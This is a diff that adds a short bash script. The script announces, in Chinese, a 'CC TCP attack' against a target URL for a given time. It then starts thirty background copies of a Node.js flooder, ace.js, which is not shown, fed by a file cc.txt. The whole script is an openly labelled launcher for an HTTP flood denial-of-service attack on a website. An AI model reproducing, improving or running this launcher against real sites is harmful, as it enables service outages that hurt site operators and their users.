@@ -1,0 +1,15 @@
+#!/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin;
+echo -e "\033[41;37m 云梦CCTCP攻击发起成功 目标:$1 时间:$2 \033[0m"
+export PATH
+
+COUNT=30
+FILE="cc.txt"
+URL=$1
+TI=$2
+GC=GET
+
+for ((integer = 1; integer <= $COUNT; integer++)) 
+do 
+	node ace.js $URL $FILE $TI $GC >/dev/null &
+done
